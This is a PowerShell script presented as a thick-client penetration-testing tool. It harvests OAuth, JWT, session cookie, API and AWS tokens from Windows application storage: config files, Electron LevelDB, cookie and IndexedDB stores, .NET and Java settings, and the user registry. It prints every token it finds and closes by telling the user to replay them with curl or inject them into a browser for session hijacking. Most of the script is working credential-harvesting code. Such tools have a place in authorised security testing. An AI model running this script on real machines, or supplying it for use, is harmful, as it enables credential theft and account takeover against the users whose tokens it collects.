<#
.SYNOPSIS
    Extract OAuth/JWT/Session tokens from thick-client storage locations.

.DESCRIPTION
    Thick clients often store authentication tokens insecurely:
    - Plaintext in config files, SQLite DBs, or localStorage
    - Electron apps: LevelDB, IndexedDB, Cookies file
    - .NET apps: user.config, app.config, isolated storage
    - Java apps: preferences, properties files

    These tokens can be replayed to impersonate users or escalate privileges.

.PARAMETER AppPath
    Application installation directory to scan

.PARAMETER AppName
    Application name for targeted scans (registry + AppData)

.EXAMPLE
    .\token_extractor.ps1 -AppPath "C:\Program Files\TargetApp"
    .\token_extractor.ps1 -AppName "TargetApp"
    .\token_extractor.ps1 -AppPath "C:\Program Files\TargetApp" -AppName "TargetApp"
#>

param(
    [string]$AppPath = "",
    [string]$AppName = ""
)

$findings = @()

function Add-Finding {
    param([string]$Location, [string]$Type, [string]$Value, [string]$Risk)
    $script:findings += [PSCustomObject]@{
        Location = $Location
        Type = $Type
        Value = if ($Value.Length -gt 80) { $Value.Substring(0, 80) + "..." } else { $Value }
        Risk = $Risk
    }
    $color = switch ($Risk) { "CRITICAL" { "Red" } "HIGH" { "Yellow" } default { "Cyan" } }
    Write-Host "[$Risk] $Type" -ForegroundColor $color
    Write-Host "  Location: $Location"
    Write-Host "  Value: $(if ($Value.Length -gt 120) { $Value.Substring(0, 120) + '...' } else { $Value })`n"
}

$tokenPatterns = @(
    @{Name="JWT Token";          Regex='eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'},
    @{Name="Bearer Token";       Regex='[Bb]earer\s+[A-Za-z0-9_\-\.]{20,}'},
    @{Name="OAuth Access Token";  Regex='access_token["''\s:=]+[A-Za-z0-9_\-\.]{20,}'},
    @{Name="OAuth Refresh Token"; Regex='refresh_token["''\s:=]+[A-Za-z0-9_\-\.]{20,}'},
    @{Name="Session ID";         Regex='session[_-]?id["''\s:=]+[A-Za-z0-9_\-]{16,}'},
    @{Name="API Key";            Regex='api[_-]?key["''\s:=]+[A-Za-z0-9_\-]{16,}'},
    @{Name="Auth Header";        Regex='[Aa]uthorization["''\s:=]+[A-Za-z0-9+/=_\-\. ]{20,}'},
    @{Name="Cookie Value";       Regex='(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|connect\.sid|_session)=[A-Za-z0-9%_\-\.]{16,}'},
    @{Name="AWS Key";            Regex='AKIA[0-9A-Z]{16}'},
    @{Name="Basic Auth (b64)";   Regex='Basic\s+[A-Za-z0-9+/=]{10,}'}
)

Write-Host "`n[*] Token Extractor for Thick-Client VAPT`n" -ForegroundColor Cyan

# ── 1. Scan Application Directory ──
if ($AppPath -and (Test-Path $AppPath)) {
    Write-Host "--- Scanning Application Directory ---" -ForegroundColor Yellow

    $configExts = @("*.config", "*.json", "*.xml", "*.ini", "*.properties", "*.yaml", "*.yml", "*.txt", "*.cfg", "*.conf")
    foreach ($ext in $configExts) {
        $files = Get-ChildItem -Path $AppPath -Filter $ext -Recurse -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                $content = Get-Content $file.FullName -Raw -ErrorAction Stop
                foreach ($pattern in $tokenPatterns) {
                    $matches = [regex]::Matches($content, $pattern.Regex)
                    foreach ($m in $matches) {
                        Add-Finding -Location $file.FullName -Type $pattern.Name -Value $m.Value -Risk "HIGH"
                    }
                }
            } catch {}
        }
    }
}

# ── 2. Scan Electron / Chromium Storage ──
Write-Host "--- Scanning Electron / Chromium Storage ---" -ForegroundColor Yellow

$electronPaths = @()
if ($AppName) {
    $electronPaths += "$env:APPDATA\$AppName"
    $electronPaths += "$env:LOCALAPPDATA\$AppName"
}
# Also scan common Electron app data locations
$electronPaths += Get-ChildItem "$env:APPDATA" -Directory -ErrorAction SilentlyContinue |
    Where-Object { Test-Path (Join-Path $_.FullName "Local Storage") } |
    ForEach-Object { $_.FullName }

foreach ($ePath in ($electronPaths | Select-Object -Unique)) {
    if (-not (Test-Path $ePath)) { continue }

    # Local Storage (LevelDB)
    $lsPath = Join-Path $ePath "Local Storage\leveldb"
    if (Test-Path $lsPath) {
        $logFiles = Get-ChildItem $lsPath -Filter "*.log" -ErrorAction SilentlyContinue
        $ldbFiles = Get-ChildItem $lsPath -Filter "*.ldb" -ErrorAction SilentlyContinue
        foreach ($f in ($logFiles + $ldbFiles)) {
            try {
                $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                foreach ($pattern in $tokenPatterns) {
                    $matches = [regex]::Matches($text, $pattern.Regex)
                    foreach ($m in $matches) {
                        Add-Finding -Location $f.FullName -Type "Electron LevelDB: $($pattern.Name)" -Value $m.Value -Risk "CRITICAL"
                    }
                }
            } catch {}
        }
    }

    # Cookies SQLite
    $cookiePath = Join-Path $ePath "Cookies"
    if (Test-Path $cookiePath) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($cookiePath)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            foreach ($pattern in $tokenPatterns) {
                $matches = [regex]::Matches($text, $pattern.Regex)
                foreach ($m in $matches) {
                    Add-Finding -Location $cookiePath -Type "Electron Cookies: $($pattern.Name)" -Value $m.Value -Risk "CRITICAL"
                }
            }
        } catch {}
    }

    # IndexedDB
    $idbPath = Join-Path $ePath "IndexedDB"
    if (Test-Path $idbPath) {
        Get-ChildItem $idbPath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                foreach ($pattern in $tokenPatterns) {
                    $matches = [regex]::Matches($text, $pattern.Regex)
                    foreach ($m in $matches) {
                        Add-Finding -Location $_.FullName -Type "IndexedDB: $($pattern.Name)" -Value $m.Value -Risk "CRITICAL"
                    }
                }
            } catch {}
        }
    }
}

# ── 3. Scan .NET User Settings ──
Write-Host "--- Scanning .NET User Settings ---" -ForegroundColor Yellow

$dotnetConfigs = Get-ChildItem "$env:LOCALAPPDATA" -Recurse -Filter "user.config" -ErrorAction SilentlyContinue -Depth 5
foreach ($cfg in $dotnetConfigs) {
    if ($AppName -and $cfg.FullName -notmatch [regex]::Escape($AppName)) { continue }
    try {
        $content = Get-Content $cfg.FullName -Raw
        foreach ($pattern in $tokenPatterns) {
            $matches = [regex]::Matches($content, $pattern.Regex)
            foreach ($m in $matches) {
                Add-Finding -Location $cfg.FullName -Type ".NET Config: $($pattern.Name)" -Value $m.Value -Risk "HIGH"
            }
        }
    } catch {}
}

# ── 4. Scan Java Preferences ──
Write-Host "--- Scanning Java Preferences ---" -ForegroundColor Yellow

$javaPrefPath = "$env:APPDATA\.java\.userPrefs"
if (Test-Path $javaPrefPath) {
    Get-ChildItem $javaPrefPath -Recurse -Filter "prefs.xml" -ErrorAction SilentlyContinue | ForEach-Object {
        if ($AppName -and $_.FullName -notmatch [regex]::Escape($AppName)) { return }
        try {
            $content = Get-Content $_.FullName -Raw
            foreach ($pattern in $tokenPatterns) {
                $matches = [regex]::Matches($content, $pattern.Regex)
                foreach ($m in $matches) {
                    Add-Finding -Location $_.FullName -Type "Java Prefs: $($pattern.Name)" -Value $m.Value -Risk "HIGH"
                }
            }
        } catch {}
    }
}

# ── 5. Registry Token Search ──
Write-Host "--- Scanning Registry ---" -ForegroundColor Yellow

$regPaths = @("HKCU:\Software")
if ($AppName) { $regPaths = @("HKCU:\Software\$AppName") }

foreach ($regPath in $regPaths) {
    if (-not (Test-Path $regPath)) { continue }
    try {
        Get-ChildItem $regPath -Recurse -ErrorAction SilentlyContinue -Depth 3 | ForEach-Object {
            $keyPath = $_.PSPath
            try {
                $props = Get-ItemProperty -Path $keyPath -ErrorAction SilentlyContinue
                $props.PSObject.Properties | Where-Object {
                    $_.Name -notmatch "^PS(Path|ParentPath|ChildName|Provider|Drive)$"
                } | ForEach-Object {
                    $val = [string]$_.Value
                    foreach ($pattern in $tokenPatterns) {
                        if ($val -match $pattern.Regex) {
                            Add-Finding -Location "$keyPath\$($_.Name)" -Type "Registry: $($pattern.Name)" -Value $Matches[0] -Risk "HIGH"
                        }
                    }
                }
            } catch {}
        }
    } catch {}
}

# ── Summary ──
Write-Host "`n=== SUMMARY ===" -ForegroundColor Cyan
Write-Host "Total findings: $($findings.Count)"
$findings | Group-Object Risk | ForEach-Object {
    Write-Host "  $($_.Name): $($_.Count)" -ForegroundColor $(switch ($_.Name) { "CRITICAL" { "Red" } "HIGH" { "Yellow" } default { "Cyan" } })
}

if ($findings.Count -gt 0) {
    Write-Host "`n[!] Tokens found in storage can be replayed with:" -ForegroundColor Yellow
    Write-Host '  curl -H "Authorization: Bearer <TOKEN>" https://api.target.com/me'
    Write-Host '  Or inject into Burp/browser for session hijacking'
}
